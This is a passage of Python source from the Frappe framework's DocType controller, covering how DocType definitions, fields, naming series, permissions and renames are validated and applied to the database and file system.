HiddenAndMandatoryWithoutDefaultError(frappe.ValidationError): pass\nclass NonUniqueError(frappe.ValidationError): pass\nclass CannotIndexedError(frappe.ValidationError): pass\nclass CannotCreateStandardDoctypeError(frappe.ValidationError): pass\n\nform_grid_templates = {\n\t\"fields\": \"templates/form_grid/fields.html\"\n}\n\nclass DocType(Document):\n\tdef get_feed(self):\n\t\treturn self.name\n\n\tdef validate(self):\n\t\t\"\"\"Validate DocType before saving.\n\n\t\t- Check if developer mode is set.\n\t\t- Validate series\n\t\t- Check fieldnames (duplication etc)\n\t\t- Clear permission table for child tables\n\t\t- Add `amended_from` and `amended_by` if Amendable\"\"\"\n\n\t\tself.check_developer_mode()\n\n\t\tself.validate_name()\n\n\t\tif self.issingle:\n\t\t\tself.allow_import = 0\n\t\t\tself.is_submittable = 0\n\t\t\tself.istable = 0\n\n\t\telif self.istable:\n\t\t\tself.allow_import = 0\n\t\t\tself.permissions = []\n\n\t\tself.scrub_field_names()\n\t\tself.set_default_in_list_view()\n\t\tself.set_default_translatable()\n\t\tself.validate_series()\n\t\tself.validate_document_type()\n\t\tvalidate_fields(self)\n\n\t\tif self.istable:\n\t\t\t# no permission records for child table\n\t\t\tself.permissions = []\n\t\telse:\n\t\t\tvalidate_permissions(self)\n\n\t\tself.make_amendable()\n\t\tself.validate_website()\n\n\t\tif not self.is_new():\n\t\t\tself.before_update = frappe.get_doc('DocType', self.name)\n\n\t\tif not self.is_new():\n\t\t\tself.setup_fields_to_fetch()\n\n\t\tif self.default_print_format and not self.custom:\n\t\t\tfrappe.throw(_('Standard DocType cannot have default print format, use Customize Form'))\n\n\tdef set_default_in_list_view(self):\n\t\t'''Set default in-list-view for first 4 mandatory fields'''\n\t\tif not [d.fieldname for d in self.fields if d.in_list_view]:\n\t\t\tcnt = 0\n\t\t\tfor d in self.fields:\n\t\t\t\tif d.reqd and not d.hidden and not d.fieldtype == \"Table\":\n\t\t\t\t\td.in_list_view = 1\n\t\t\t\t\tcnt += 1\n\t\t\t\t\tif cnt == 4: break\n\n\tdef set_default_translatable(self):\n\t\t'''Ensure that non-translatable never will be translatable'''\n\t\tfor d in self.fields:\n\t\t\tif d.translatable and not supports_translation(d.fieldtype):\n\t\t\t\td.translatable = 0\n\n\tdef check_developer_mode(self):\n\t\t\"\"\"Throw exception if not developer mode or via patch\"\"\"\n\t\tif frappe.flags.in_patch or frappe.flags.in_test:\n\t\t\treturn\n\n\t\tif not frappe.conf.get(\"developer_mode\") and not self.custom:\n\t\t\tfrappe.throw(_(\"Not in Developer Mode! Set in site_config.json or make 'Custom' DocType.\"), CannotCreateStandardDoctypeError)\n\n\tdef setup_fields_to_fetch(self):\n\t\t'''Setup query to update values for newly set fetch values'''\n\t\ttry:\n\t\t\told_meta = frappe.get_meta(frappe.get_doc('DocType', self.name), cached=False)\n\t\t\told_fields_to_fetch = [df.fieldname for df in old_meta.get_fields_to_fetch()]\n\t\texcept frappe.DoesNotExistError:\n\t\t\told_fields_to_fetch = []\n\n\t\tnew_meta = frappe.get_meta(self, cached=False)\n\n\t\tself.flags.update_fields_to_fetch_queries = []\n\n\t\tif set(old_fields_to_fetch) != set([df.fieldname for df in new_meta.get_fields_to_fetch()]):\n\t\t\tfor df in new_meta.get_fields_to_fetch():\n\t\t\t\tif df.fieldname not in old_fields_to_fetch:\n\t\t\t\t\tlink_fieldname, source_fieldname = df.fetch_from.split('.', 1)\n\t\t\t\t\tlink_df = new_meta.get_field(link_fieldname)\n\n\t\t\t\t\tself.flags.update_fields_to_fetch_queries.append('''update\n\t\t\t\t\t\t\t`tab{link_doctype}` source,\n\t\t\t\t\t\t\t`tab{doctype}` target\n\t\t\t\t\t\tset\n\t\t\t\t\t\t\ttarget.`{fieldname}` = source.`{source_fieldname}`\n\t\t\t\t\t\twhere\n\t\t\t\t\t\t\ttarget.`{link_fieldname}` = source.name\n\t\t\t\t\t\t\tand ifnull(target.`{fieldname}`, '')=\"\" '''.format(\n\t\t\t\t\t\t\t\tlink_doctype = link_df.options,\n\t\t\t\t\t\t\t\tsource_fieldname = source_fieldname,\n\t\t\t\t\t\t\t\tdoctype = self.name,\n\t\t\t\t\t\t\t\tfieldname = df.fieldname,\n\t\t\t\t\t\t\t\tlink_fieldname = link_fieldname\n\t\t\t\t\t))\n\n\tdef update_fields_to_fetch(self):\n\t\t'''Update fetch values based on queries setup'''\n\t\tif self.flags.update_fields_to_fetch_queries and not self.issingle:\n\t\t\tfor query in self.flags.update_fields_to_fetch_queries:\n\t\t\t\tfrappe.db.sql(query)\n\n\tdef validate_document_type(self):\n\t\tif self.document_type==\"Transaction\":\n\t\t\tself.document_type = \"Document\"\n\t\tif self.document_type==\"Master\":\n\t\t\tself.document_type = \"Setup\"\n\n\tdef validate_website(self):\n\t\t\"\"\"Ensure that website generator has field 'route'\"\"\"\n\t\tif self.has_web_view:\n\t\t\t# route field must be present\n\t\t\tif not 'route' in [d.fieldname for d in self.fields]:\n\t\t\t\tfrappe.throw(_('Field \"route\" is mandatory for Web Views'), title='Missing Field')\n\n\t\t\t# clear website cache\n\t\t\tfrappe.website.render.clear_cache()\n\n\tdef change_modified_of_parent(self):\n\t\t\"\"\"Change the timestamp of parent DocType if the current one is a child to clear caches.\"\"\"\n\t\tif frappe.flags.in_import:\n\t\t\treturn\n\t\tparent_list = frappe.db.sql(\"\"\"SELECT parent\n\t\t\tfrom tabDocField where fieldtype=\"Table\" and options=%s\"\"\", self.name)\n\t\tfor p in parent_list:\n\t\t\tfrappe.db.sql('UPDATE tabDocType SET modified=%s WHERE `name`=%s', (now(), p[0]))\n\n\tdef scrub_field_names(self):\n\t\t\"\"\"Sluggify fieldnames if not set from Label.\"\"\"\n\t\trestricted = ('name','parent','creation','modified','modified_by',\n\t\t\t'parentfield','parenttype','file_list', 'flags', 'docstatus')\n\t\tfor d in self.get(\"fields\"):\n\t\t\tif d.fieldtype:\n\t\t\t\tif (not getattr(d, \"fieldname\", None)):\n\t\t\t\t\tif d.label:\n\t\t\t\t\t\td.fieldname = d.label.strip().lower().replace(' ','_')\n\t\t\t\t\t\tif d.fieldname in restricted:\n\t\t\t\t\t\t\td.fieldname = d.fieldname + '1'\n\t\t\t\t\t\tif d.fieldtype=='Section Break':\n\t\t\t\t\t\t\td.fieldname = d.fieldname + '_section'\n\t\t\t\t\t\telif d.fieldtype=='Column Break':\n\t\t\t\t\t\t\td.fieldname = d.fieldname + '_column'\n\t\t\t\t\telse:\n\t\t\t\t\t\td.fieldname = d.fieldtype.lower().replace(\" \",\"_\") + \"_\" + str(d.idx)\n\n\t\t\t\td.fieldname = re.sub('''['\",./%@()<>{}]''', '', d.fieldname)\n\n\t\t\t\t# fieldnames should be lowercase\n\t\t\t\td.fieldname = d.fieldname.lower()\n\n\t\t\t# unique is automatically an index\n\t\t\tif d.unique: d.search_index = 0\n\n\tdef validate_series(self, autoname=None, name=None):\n\t\t\"\"\"Validate if `autoname` property is correctly set.\"\"\"\n\t\tif not autoname: autoname = self.autoname\n\t\tif not name: name = self.name\n\n\t\tif not autoname and self.get(\"fields\", {\"fieldname\":\"naming_series\"}):\n\t\t\tself.autoname = \"naming_series:\"\n\n\t\t# validate field name if autoname field:fieldname is used\n\t\t# Create unique index on autoname field automatically.\n\t\tif autoname and autoname.startswith('field:'):\n\t\t\tfield = autoname.split(\":\")[1]\n\t\t\tif not field or field not in [ df.fieldname for df in self.fields ]:\n\t\t\t\tfrappe.throw(_(\"Invalid fieldname '{0}' in autoname\".format(field)))\n\t\t\telse:\n\t\t\t\tfor df in self.fields:\n\t\t\t\t\tif df.fieldname == field:\n\t\t\t\t\t\tdf.unique = 1\n\t\t\t\t\t\tbreak\n\n\t\tif autoname and (not autoname.startswith('field:')) \\\n\t\t\tand (not autoname.startswith('eval:')) \\\n\t\t\tand (not autoname.lower() in ('prompt', 'hash')) \\\n\t\t\tand (not autoname.startswith('naming_series:')):\n\n\t\t\tprefix = autoname.split('.')[0]\n\t\t\tused_in = frappe.db.sql('select name from tabDocType where substring_index(autoname, \".\", 1) = %s and name!=%s', (prefix, name))\n\t\t\tif used_in:\n\t\t\t\tfrappe.throw(_(\"Series {0} already used in {1}\").format(prefix, used_in[0][0]))\n\n\tdef on_update(self):\n\t\t\"\"\"Update database schema, make controller templates if `custom` is not set and clear cache.\"\"\"\n\t\tfrom frappe.model.db_schema import updatedb\n\t\tself.delete_duplicate_custom_fields()\n\t\ttry:\n\t\t\tupdatedb(self.name, self)\n\t\texcept Exception as e:\n\t\t\tprint(\"\\n\\nThere was an issue while migrating the DocType: {}\\n\".format(self.name))\n\t\t\traise e\n\n\t\tself.change_modified_of_parent()\n\t\tmake_module_and_roles(self)\n\n\t\tself.update_fields_to_fetch()\n\n\t\tfrom frappe import conf\n\t\tif not self.custom and not (frappe.flags.in_import or frappe.flags.in_test) and conf.get('developer_mode'):\n\t\t\tself.export_doc()\n\t\t\tself.make_controller_template()\n\n\t\t\tif self.has_web_view:\n\t\t\t\tself.set_base_class_for_controller()\n\n\t\t# update index\n\t\tif not self.custom:\n\t\t\tself.run_module_method(\"on_doctype_update\")\n\t\t\tif self.flags.in_insert:\n\t\t\t\tself.run_module_method(\"after_doctype_insert\")\n\n\t\tdelete_notification_count_for(doctype=self.name)\n\t\tfrappe.clear_cache(doctype=self.name)\n\n\t\tif not frappe.flags.in_install and hasattr(self, 'before_update'):\n\t\t\tself.sync_global_search()\n\n\t\t# clear from local cache\n\t\tif self.name in frappe.local.meta_cache:\n\t\t\tdel frappe.local.meta_cache[self.name]\n\n\t\tclear_linked_doctype_cache()\n\n\tdef delete_duplicate_custom_fields(self):\n\t\tif not (frappe.db.table_exists(self.name) and frappe.db.table_exists(\"Custom Field\")):\n\t\t\treturn\n\t\tfields = [d.fieldname for d in self.fields if d.fieldtype in type_map]\n\t\tfrappe.db.sql('''delete from\n\t\t\t\t`tabCustom Field`\n\t\t\twhere\n\t\t\t\t dt = {0} and fieldname in ({1})\n\t\t'''.format('%s', ', '.join(['%s'] * len(fields))), tuple([self.name] + fields), as_dict=True)\n\n\tdef sync_global_search(self):\n\t\t'''If global search settings are changed, rebuild search properties for this table'''\n\t\tglobal_search_fields_before_update = [d.fieldname for d in\n\t\t\tself.before_update.fields if d.in_global_search]\n\t\tif self.before_update.show_name_in_global_search:\n\t\t\tglobal_search_fields_before_update.append('name')\n\n\t\tglobal_search_fields_after_update = [d.fieldname for d in\n\t\t\tself.fields if d.in_global_search]\n\t\tif self.show_name_in_global_search:\n\t\t\tglobal_search_fields_after_update.append('name')\n\n\t\tif set(global_search_fields_before_update) != set(global_search_fields_after_update):\n\t\t\tnow = (not frappe.request) or frappe.flags.in_test or frappe.flags.in_install\n\t\t\tfrappe.enqueue('frappe.utils.global_search.rebuild_for_doctype',\n\t\t\t\tnow=now, doctype=self.name)\n\n\tdef set_base_class_for_controller(self):\n\t\t'''Updates the controller class to subclass from `WebsiteGenertor`,\n\t\tif it is a subclass of `Document`'''\n\t\tcontroller_path = frappe.get_module_path(frappe.scrub(self.module),\n\t\t\t'doctype', frappe.scrub(self.name), frappe.scrub(self.name) + '.py')\n\n\t\twith open(controller_path, 'r') as f:\n\t\t\tcode = f.read()\n\n\t\tclass_string = '\\nclass {0}(Document)'.format(self.name.replace(' ', ''))\n\t\tif '\\nfrom frappe.model.document import Document' in code and class_string in code:\n\t\t\tcode = code.replace('from frappe.model.document import Document',\n\t\t\t\t'from frappe.website.website_generator import WebsiteGenerator')\n\t\t\tcode = code.replace('class {0}(Document)'.format(self.name.replace(' ', '')),\n\t\t\t\t'class {0}(WebsiteGenerator)'.format(self.name.replace(' ', '')))\n\n\t\twith open(controller_path, 'w') as f:\n\t\t\tf.write(code)\n\n\n\tdef run_module_method(self, method):\n\t\tfrom frappe.modules import load_doctype_module\n\t\tmodule = load_doctype_module(self.name, self.module)\n\t\tif hasattr(module, method):\n\t\t\tgetattr(module, method)()\n\n\tdef before_rename(self, old, new, merge=False):\n\t\t\"\"\"Throw exception if merge. DocTypes cannot be merged.\"\"\"\n\t\tif not self.custom and frappe.session.user != \"Administrator\":\n\t\t\tfrappe.throw(_(\"DocType can only be renamed by Administrator\"))\n\n\t\tself.check_developer_mode()\n\t\tself.validate_name(new)\n\n\t\tif merge:\n\t\t\tfrappe.throw(_(\"DocType can not be merged\"))\n\n\t\t# Do not rename and move files and folders for custom doctype\n\t\tif not self.custom and not frappe.flags.in_test and not frappe.flags.in_patch:\n\t\t\tself.rename_files_and_folders(old, new)\n\n\tdef after_rename(self, old, new, merge=False):\n\t\t\"\"\"Change table name using `RENAME TABLE` if table exists. Or update\n\t\t`doctype` property for Single type.\"\"\"\n\t\tif self.issingle:\n\t\t\tfrappe.db.sql(\"\"\"update tabSingles set doctype=%s where doctype=%s\"\"\", (new, old))\n\t\t\tfrappe.db.sql(\"\"\"update tabSingles set value=%s\n\t\t\t\twhere doctype=%s and field='name' and value = %s\"\"\", (new, new, old))\n\t\telse:\n\t\t\tfrappe.db.sql(\"rename table `tab%s` to `tab%s`\" % (old, new))\n\n\tdef rename_files_and_folders(self, old, new):\n\t\t# move files\n\t\tnew_path = get_doc_path(self.module, 'doctype', new)\n\t\tsubprocess.check_output(['mv', get_doc_path(self.module, 'doctype', old), new_path])\n\n\t\t# rename files\n\t\tfor fname in os.listdir(new_path):\n\t\t\tif frappe.scrub(old) in fname:\n\t\t\t\tsubprocess.check_output(['mv', os.path.join(new_path, fname),\n\t\t\t\t\tos.path.join(new_path, fname.replace(frappe.scrub(old), frappe.scrub(new)))])\n\n\t\tself.rename_inside_controller(new, old, new_path)\n\t\tfrappe.msgprint('Renamed files and replaced code in controllers, please check!')\n\n\tdef rename_inside_controller(self, new, old, new_path):\n\t\tfor fname in ('{}.js', '{}.py', '{}_list.js', '{}_calendar.js', 'test_{}.py', 'test_{}.js'):\n\t\t\tfname = os.path.join(new_path, fname.format(frappe.scrub(new)))\n\t\t\tif os.path.exists(fname):\n\t\t\t\twith open(fname, 'r') as f:\n\t\t\t\t\tcode = f.read()\n\t\t\t\twith open(fname, 'w') as f:\n\t\t\t\t\tf.write(code.replace(frappe.scrub(old).replace(' ', ''), frappe.scrub(new).replace(' ', '')))\n\n\tdef before_reload(self):\n\t\t\"\"\"Preserve naming series changes in Property Setter.\"\"\"\n\t\tif not (self.issingle and self.istable):\n\t\t\tself.preserve_naming_series_options_in_property_setter()\n\n\tdef preserve_naming_series_options_in_property_setter(self):\n\t\t\"\"\"Preserve naming_series as property setter if it does not exist\"\"\"\n\t\tnaming_series = self.get(\"fields\", {\"fieldname\": \"naming_series\"})\n\n\t\tif not naming_series:\n\t\t\treturn\n\n\t\t# check if atleast 1 record exists\n\t\tif not (frappe.db.table_exists(self.name) and frappe.db.sql(\"select name from `tab{}` limit 1\".format(self.name))):\n\t\t\treturn\n\n\t\texisting_property_setter = frappe.db.get_value(\"Property Setter\", {\"doc_type\": self.name,\n\t\t\t\"property\": \"options\", \"field_name\": \"naming_series\"})\n\n\t\tif not existing_property_setter:\n\t\t\tmake_property_setter(self.name, \"naming_series\", \"options\", naming_series[0].options, \"Text\", validate_fields_for_doctype=False)\n\t\t\tif naming_series[0].default:\n\t\t\t\tmake_property_setter(self.name, \"naming_series\", \"default\", naming_series[0].default, \"Text\", validate_fields_for_doctype=False)\n\n\tdef export_doc(self):\n\t\t\"\"\"Export to standard folder `[module]/doctype/[name]/[name].json`.\"\"\"\n\t\tfrom frappe.modules.export_file import export_to_files\n\t\texport_to_files(record_list=[['DocType', self.name]], create_init=True)\n\n\tdef import_doc(self):\n\t\t\"\"\"Import from standard folder `[module]/doctype/[name]/[name].json`.\"\"\"\n\t\tfrom frappe.modules.import_module import import_from_files\n\t\timport_from_files(record_list=[[self.module, 'doctype', self.name]])\n\n\tdef make_controller_template(self):\n\t\t\"\"\"Make boilerplate controller template.\"\"\"\n\t\tmake_boilerplate(\"controller._py\", self)\n\n\t\tif not self.istable:\n\t\t\tmake_boilerplate(\"test_controller._py\", self.as_dict())\n\t\t\tmake_boilerplate(\"controller.js\", self.as_dict())\n\t\t\t#make_boilerplate(\"controller_list.js\", self.as_dict())\n\t\t\tif not os.path.exists(frappe.get_module_path(frappe.scrub(self.module),\n\t\t\t\t'doctype', frappe.scrub(self.name), 'tests')):\n\t\t\t\tmake_boilerplate(\"test_controller.js\", self.as_dict())\n\n\t\tif self.has_web_view:\n\t\t\ttemplates_path = frappe.get_module_path(frappe.scrub(self.module), 'doctype', frappe.scrub(self.name), 'templates')\n\t\t\tif not os.path.exists(templates_path):\n\t\t\t\tos.makedirs(templates_path)\n\t\t\tmake_boilerplate('templates/controller.html', self.as_dict())\n\t\t\tmake_boilerplate('templates/controller_row.html', self.as_dict())\n\n\tdef make_amendable(self):\n\t\t\"\"\"If is_submittable is set, add amended_from docfields.\"\"\"\n\t\tif self.is_submittable:\n\t\t\tif not frappe.db.sql(\"\"\"select name from tabDocField\n\t\t\t\twhere fieldname = 'amended_from' and parent = %s\"\"\", self.name):\n\t\t\t\t\tself.append(\"fields\", {\n\t\t\t\t\t\t\"label\": \"Amended From\",\n\t\t\t\t\t\t\"fieldtype\": \"Link\",\n\t\t\t\t\t\t\"fieldname\": \"amended_from\",\n\t\t\t\t\t\t\"options\": self.name,\n\t\t\t\t\t\t\"read_only\": 1,\n\t\t\t\t\t\t\"print_hide\": 1,\n\t\t\t\t\t\t\"no_copy\": 1\n\t\t\t\t\t})\n\n\tdef get_max_idx(self):\n\t\t\"\"\"Returns the highest `idx`\"\"\"\n\t\tmax_idx = frappe.db.sql(\"\"\"select max(idx) from `tabDocField` where parent = %s\"\"\",\n\t\t\tself.name)\n\t\treturn max_idx and max_idx[0][0] or 0\n\n\tdef validate_name(self, name=None):\n\t\tif not name:\n\t\t\tname = self.name\n\n\t\t# a DocType's name should not start with a number or underscore\n\t\t# and should only contain letters, numbers and underscore\n\t\tif six.PY2:\n\t\t\tis_a_valid_name = re.match(\"^(?![\\W])[^\\d_\\s][\\w ]+$\", name)\n\t\telse:\n\t\t\tis_a_valid_name = re.match(\"^(?![\\W])[^\\d_\\s][\\w ]+$\", name, flags = re.ASCII)\n\t\tif not is_a_valid_name:\n\t\t\tfrappe.throw(_(\"DocType's name should start with a letter and it can only consist of letters, numbers, spaces and underscores\"), frappe.NameError)\n\ndef validate_fields_for_doctype(doctype):\n\tdoc = frappe.get_doc(\"DocType\", doctype)\n\tdoc.delete_duplicate_custom_fields()\n\tvalidate_fields(frappe.get_meta(doctype, cached=False))\n\n# this is separate because it is also called via custom field\ndef validate_fields(meta):\n\t\"\"\"Validate doctype fields. Checks\n\t1. There are no illegal characters in fieldnames\n\t2. If fieldnames are unique.\n\t3. Validate column length.\n\t4. Fields that do have database columns are not mandatory.\n\t5. `Link` and `Table` options are valid.\n\t6. **Hidden** and **Mandatory** are not set simultaneously.\n\t7. `Check` type field has default as 0 or 1.\n\t8. `Dynamic Links` are correctly defined.\n\t9. Precision is set in numeric fields and is between 1 & 6.\n\t10. Fold is not at the end (if set).\n\t11. `search_fields` are valid.\n\t12. `title_field` and title field pattern are valid.\n\t13. `unique` check is only valid for Data, Link and Read Only fieldtypes.\n\t14. `unique` cannot be checked if there exist non-unique values.\n\n\t:param meta: `frappe.model.meta.Meta` object to check.\"\"\"\n\tdef check_illegal_characters(fieldname):\n\t\tvalidate_column_name(fieldname)\n\n\tdef check_unique_fieldname(docname, fieldname):\n\t\tduplicates = list(filter(None, map(lambda df: df.fieldname==fieldname and str(df.idx) or None, fields)))\n\t\tif len(duplicates) > 1:\n\t\t\tfrappe.throw(_(\"{0}: Fieldname {1} appears multiple times in rows {2}\").format(docname, fieldname, \", \".join(duplicates)), UniqueFieldnameError)\n\n\tdef check_fieldname_length(fieldname):\n\t\tvalidate_column_length(fieldname)\n\n\tdef check_illegal_mandatory(docname, d):\n\t\tif (d.fieldtype in no_value_fields) and d.fieldtype!=\"Table\" and d.reqd:\n\t\t\tfrappe.throw(_(\"{0}: Field {1} of type {2} cannot be mandatory\").format(docname, d.label, d.fieldtype), IllegalMandatoryError)\n\n\tdef check_link_table_options(docname, d):\n\t\tif d.fieldtype in (\"Link\", \"Table\"):\n\t\t\tif not d.options:\n\t\t\t\tfrappe.throw(_(\"{0}: Options required for Link or Table type field {1} in row {2}\").format(docname, d.label, d.idx), DoctypeLinkError)\n\t\t\tif d.options==\"[Select]\" or d.options==d.parent:\n\t\t\t\treturn\n\t\t\tif d.options != d.parent:\n\t\t\t\toptions = frappe.db.get_value(\"DocType\", d.options, \"name\")\n\t\t\t\tif not options:\n\t\t\t\t\tfrappe.throw(_(\"{0}: Options must be a valid DocType for field {1} in row {2}\").format(docname, d.label, d.idx), WrongOptionsDoctypeLinkError)\n\t\t\t\telif not (options == d.options):\n\t\t\t\t\tfrappe.throw(_(\"{0}: Options {1} must be the same as doctype name {2} for the field {3}\", DoctypeLinkError)\n\t\t\t\t\t\t.format(docname, d.options, options, d.label))\n\t\t\t\telse:\n\t\t\t\t\t# fix case\n\t\t\t\t\td.options = options\n\n\tdef check_hidden_and_mandatory(docname, d):\n\t\tif d.hidden and d.reqd and not d.default:\n\t\t\tfrappe.throw(_(\"{0}: Field {1} in row {2} cannot be hidden and mandatory without default\").format(docname, d.label, d.idx), HiddenAndMandatoryWithoutDefaultError)\n\n\tdef check_width(d):\n\t\tif d.fieldtype == \"Currency\" and cint(d.width) < 100:\n\t\t\tfrappe.throw(_(\"Max width for type Currency is 100px in row {0}\").format(d.idx))\n\n\tdef check_in_list_view(d):\n\t\tif d.in_list_view and (d.fieldtype in not_allowed_in_list_view):\n\t\t\tfrappe.throw(_(\"'In List View' not allowed for type {0} in row {1}\").format(d.fieldtype, d.idx))\n\n\tdef check_in_global_search(d):\n\t\tif d.in_global_search and d.fieldtype in no_value_fields:\n\t\t\tfrappe.throw(_(\"'In Global Search' not allowed for type {0} in row {1}\")\n\t\t\t\t.format(d.fieldtype, d.idx))\n\n\tdef check_dynamic_link_options(d):\n\t\tif d.fieldtype==\"Dynamic Link\":\n\t\t\tdoctype_pointer = list(filter(lambda df: df.fieldname==d.options, fields))\n\t\t\tif not doctype_pointer or (doctype_pointer[0].fieldtype not in (\"Link\", \"Select\")) \\\n\t\t\t\tor (doctype_pointer[0].fieldtype==\"Link\" and doctype_pointer[0].options!=\"DocType\"):\n\t\t\t\tfrappe.throw(_(\"Options 'Dynamic Link' type of field must point to another Link Field with options as 'DocType'\"))\n\n\tdef check_illegal_default(d):\n\t\tif d.fieldtype == \"Check\" and d.default and d.default not in ('0', '1'):\n\t\t\tfrappe.throw(_(\"Default for 'Check' type of field must be either '0' or '1'\"))\n\t\tif d.fieldtype == \"Select\" and d.default and (d.default not in d.options.split(\"\\n\")):\n\t\t\tfrappe.throw(_(\"Default for {0} must be an option\").format(d.fieldname))\n\n\tdef check_precision(d):\n\t\tif d.fieldtype in (\"Currency\", \"Float\", \"Percent\") and d.precision is not None and not (1 <= cint(d.precision) <= 6):\n\t\t\tfrappe.throw(_(\"Precision should be between 1 and 6\"))\n\n\tdef check_unique_and_text(docname, d):\n\t\tif meta.issingle:\n\t\t\td.unique = 0\n\t\t\td.search_index = 0\n\n\t\tif getattr(d, \"unique\", False):\n\t\t\tif d.fieldtype not in (\"Data\", \"Link\", \"Read Only\"):\n\t\t\t\tfrappe.throw(_(\"{0}: Fieldtype {1} for {2} cannot be unique\").format(docname, d.fieldtype, d.label), NonUniqueError)\n\n\t\t\tif not d.get(\"__islocal\"):\n\t\t\t\ttry:\n\t\t\t\t\thas_non_unique_values = frappe.db.sql(\"\"\"select `{fieldname}`, count(*)\n\t\t\t\t\t\tfrom `tab{doctype}` where ifnull({fieldname}, '') != ''\n\t\t\t\t\t\tgroup by `{fieldname}` having count(*) > 1 limit 1\"\"\".format(\n\t\t\t\t\t\tdoctype=d.parent, fieldname=d.fieldname))\n\n\t\t\t\texcept pymysql.InternalError as e:\n\t\t\t\t\tif e.args and e.args[0] == ER.BAD_FIELD_ERROR:\n\t\t\t\t\t\t# ignore if missing column, else raise\n\t\t\t\t\t\t# this happens in case of Custom Field\n\t\t\t\t\t\tpass\n\t\t\t\t\telse:\n\t\t\t\t\t\traise\n\n\t\t\t\telse:\n\t\t\t\t\t# else of try block\n\t\t\t\t\tif has_non_unique_values and has_non_unique_values[0][0]:\n\t\t\t\t\t\tfrappe.throw(_(\"{0}: Field '{1}' cannot be set as Unique as it has non-unique values\").format(docname, d.label), NonUniqueError)\n\n\t\tif d.search_index and d.fieldtype in (\"Text\", \"Long Text\", \"Small Text\", \"Code\", \"Text Editor\"):\n\t\t\tfrappe.throw(_(\"{0}:Fieldtype {1} for {2} cannot be indexed\").format(docname, d.fieldtype, d.label), CannotIndexedError)\n\n\tdef check_fold(fields):\n\t\tfold_exists = False\n\t\tfor i, f in enumerate(fields):\n\t\t\tif f.fieldtype==\"Fold\":\n\t\t\t\tif fold_exists:\n\t\t\t\t\tfrappe.throw(_(\"There can be only one Fold in a form\"))\n\t\t\t\tfold_exists = True\n\t\t\t\tif i < len(fields)-1:\n\t\t\t\t\tnxt = fields[i+1]\n\t\t\t\t\tif nxt.fieldtype != \"Section Break\":\n\t\t\t\t\t\tfrappe.throw(_(\"Fold must come before a Section Break\"))\n\t\t\t\telse:\n\t\t\t\t\tfrappe.throw(_(\"Fold can not be at the end of the form\"))\n\n\tdef check_search_fields(meta, fields):\n\t\t\"\"\"Throw exception if `search_fields` don't contain valid fields.\"\"\"\n\t\tif not meta.search_fields:\n\t\t\treturn\n\n\t\t# No value fields should not be included in search field\n\t\tsearch_fields = [field.strip() for field in (meta.search_fields or \"\").split(\",\")]\n\t\tfieldtype_mapper = { field.fieldname: field.fieldtype \\\n\t\t\tfor field in filter(lambda field: field.fieldname in search_fields, fields) }\n\n\t\tfor fieldname in search_fields:\n\t\t\tfieldname = fieldname.strip()\n\t\t\tif (fieldtype_mapper.get(fieldname) in no_value_fields) or \\\n\t\t\t\t(fieldname not in fieldname_list):\n\t\t\t\tfrappe.throw(_(\"Search field {0} is not valid\").format(fieldname))\n\n\tdef check_title_field(meta):\n\t\t\"\"\"Throw exception if `title_field` isn't a valid fieldname.\"\"\"\n\t\tif not meta.get(\"title_field\"):\n\t\t\treturn\n\n\t\tif meta.title_field not in fieldname_list:\n\t\t\tfrappe.throw(_(\"Title field must be a valid fieldname\"), InvalidFieldNameError)\n\n\t\tdef _validate_title_field_pattern(pattern):\n\t\t\tif not pattern:\n\t\t\t\treturn\n\n\t\t\tfor fieldname in re.findall(\"{(.*?)}\", pattern, re.UNICODE):\n\t\t\t\tif fieldname.startswith(\"{\"):\n\t\t\t\t\t# edge case when double curlies are used for escape\n\t\t\t\t\tcontinue\n\n\t\t\t\tif fieldname not in fieldname_list:\n\t\t\t\t\tfrappe.throw(_(\"{{{0}}} is not a valid fieldname pattern. It should be {{field_name}}.\").format(fieldname),\n\t\t\t\t\t\tInvalidFieldNameError)\n\n\t\tdf = meta.get(\"fields\", filters={\"fieldname\": meta.title_field})[0]\n\t\tif df:\n\t\t\t_validate_title_field_pattern(df.options)\n\t\t\t_validate_title_field_pattern(df.default)\n\n\tdef check_image_field(meta):\n\t\t'''check image_field exists and is of type \"Attach Image\"'''\n\t\tif not meta.image_field:\n\t\t\treturn\n\n\t\tdf = meta.get(\"fields\", {\"fieldname\": meta.image_field})\n\t\tif not df:\n\t\t\tfrappe.throw(_(\"Image field must be a valid fieldname\"), InvalidFieldNameError)\n\t\tif df[0].fieldtype != 'Attach Image':\n\t\t\tfrappe.throw(_(\"Image field must be of type Attach Image\"), InvalidFieldNameError)\n\n\tdef check_is_published_field(meta):\n\t\tif not meta.is_published_field:\n\t\t\treturn\n\n\t\tif meta.is_published_field not in fieldname_list:\n\t\t\tfrappe.throw(_(\"Is Published Field must be a valid fieldname\"), InvalidFieldNameError)\n\n\tdef check_timeline_field(meta):\n\t\tif not meta.timeline_field:\n\t\t\treturn\n\n\t\tif meta.timeline_field not in fieldname_list:\n\t\t\tfrappe.throw(_(\"Timeline field must be a valid fieldname\"), InvalidFieldNameError)\n\n\t\tdf = meta.get(\"fields\", {\"fieldname\": meta.timeline_field})[0]\n\t\tif df.fieldtype not in (\"Link\", \"Dynamic Link\"):\n\t\t\tfrappe.throw(_(\"Timeline field must be a Link or Dynamic Link\"), InvalidFieldNameError)\n\n\tdef check_sort_field(meta):\n\t\t'''Validate that sort_field(s) is a valid field'''\n\t\tif meta.sort_field:\n\t\t\tsort_fields = [meta.sort_field]\n\t\t\tif ','  in meta.sort_field:\n\t\t\t\tsort_fields = [d.split()[0] for d in meta.sort_field.split(',')]\n\n\t\t\tfor fieldname in sort_fields:\n\t\t\t\tif not fieldname in fieldname_list + list(default_fields):\n\t\t\t\t\tfrappe.throw(_(\"Sort field {0} must be a valid fieldname\").format(fieldname),\n\t\t\t\t\t\tInvalidFieldNameError)\n\n\tdef check_illegal_depends_on_conditions(docfield):\n\t\t''' assignment operation should not be allowed in the depends on condition.'''\n\t\tdepends_on_fields = [\"depends_on\", \"collapsible_depends_on\"]\n\t\tfor field in depends_on_fields:\n\t\t\tdepends_on = docfield.get(field, None)\n\t\t\tif depends_on and (\"=\" in depends_on) and \\\n\t\t\t\tre.match(\"\"\"[\\w\\.:_]+\\s*={1}\\s*[\\w\\.@'\"]+\"\"\", depends_on):\n\t\t\t\tfrappe.throw(_(\"Invalid {0} condition\").format(frappe.unscrub(field)), frappe.ValidationError)\n\n\tdef scrub_options_in_select(field):\n\t\t\"\"\"Strip options for whitespaces\"\"\"\n\n\t\tif field.fieldtype == \"Select\" and field.options is not None:\n\t\t\toptions_list = []\n\t\t\tfor i, option in enumerate(field.options.split(\"\\n\")):\n\t\t\t\t_option = 